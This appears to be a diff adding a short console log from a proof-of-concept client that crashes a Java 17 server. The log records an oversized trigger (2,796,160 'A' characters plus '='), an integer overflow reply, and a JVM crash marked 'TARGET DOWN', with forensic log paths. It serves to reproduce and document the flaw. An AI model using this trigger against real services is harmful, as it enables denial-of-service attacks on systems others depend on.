@@ -1,0 +1,9 @@
+[client] < PONG java=17.0.20 triggerLen=2796161 probe=REPRODUCED ready=true
+[client] building trigger len=2796161 (2796160 'A' + '=') and firing...
+[client] < HIT shot=1 row=1 len=1048560->-1503028570 (0xA6699AA6)
+[client] *** TARGET DOWN *** JVM crashed (verified: port closed). fire=102ms total=612ms
+[client] forensics: server logs/hs_err_ddh_pid*.log (EXCEPTION_ACCESS_VIOLATION)
+[client] evidence chain complete: network payload -> HIT reply -> JVM dead
+
+[run-client] finished (exit code 0: 0=TARGET DOWN 1=hit-alive 2=survived 3=error)
+Press any key to continue . . . 
